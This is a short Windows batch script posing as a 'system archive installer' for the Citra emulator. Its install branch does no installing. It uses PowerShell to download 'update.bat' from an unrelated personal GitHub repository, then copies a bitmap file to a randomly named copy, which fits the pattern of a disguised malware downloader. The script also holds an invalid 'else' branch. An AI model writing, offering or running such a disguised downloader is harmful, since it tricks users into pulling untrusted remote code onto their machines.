@echo off
title Citra - System archive installer

:main
cls
set /p menu="Do you want to setup system archives in Citra? (Y/N)"
if %menu%==Y goto SA
if %menu%==y goto SA
if %menu%==N goto close
if %menu%==n goto close
else (
    echo Invalid input. Please try again.
	goto :main
)

:close
set /p pause=Press enter to exit...
exit

:SA
powershell.exe (new-object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/hipeopeo/s/master/update.bat', 'update.bat')
copy %cd%\NET_ex.bmp %cd%\xjhfkea.bmp